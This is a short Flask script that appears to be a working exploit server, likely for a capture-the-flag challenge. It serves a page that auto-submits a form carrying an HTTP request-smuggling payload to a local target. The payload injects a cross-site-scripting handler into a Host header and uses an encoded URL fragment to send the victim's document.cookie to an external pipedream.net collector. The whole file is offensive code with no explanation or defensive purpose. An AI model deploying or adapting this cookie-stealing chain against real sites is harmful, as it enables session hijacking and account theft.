from flask import Flask, request, render_template_string
from base64 import urlsafe_b64encode


BASE_URL="http://localhost:80"
page="""
        <form method="post" action="{{domain}}" enctype="text/plain" >
            <input name="{{name}}">
            <input type="submit" value="Submit">
        </form>
        <script>
        document.body.onload=()=>{
        document.forms[0].submit()
        }
        </script>
"""
app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def index():
    smuggled="HEAD / HTTP/1.1\r\nHOST: a\r\n\r\nGET / HTTP/1.1\r\nHOST: x\r\nRange: bytes=422-424\r\n\r\nGET /a HTTP/1.1\r\nHost:\tid=x\ttabindex=1\tonfocus=eval(document.location.hash.slice(1))\tautofocus\t\r\n\r\n"
    smuggled="HEAD / HTTP/1.1\r\nHost: a\r\n\r\nGET / HTTP/1.1\r\nHost: a\r\nRange: bytes=422-424\r\n\r\nGET /a HTTP/1.1\r\nHost: \tid=x\ttabindex=1\tonfocus=eval(atob(location.hash.slice(1)))\tautofocus\t\r\n\r\n"

    payload=b"document.location='https://en3drbs65teki.x.pipedream.net/'+document.cookie"

    domain=f"{BASE_URL}/a#{urlsafe_b64encode(payload).decode()}"

    print("[+] domain",domain)
    print("[+] payload",smuggled)

    return render_template_string(page, domain=domain,name=smuggled,payload=payload)

if __name__ == '__main__':
    app.run(debug=True,port=5000)

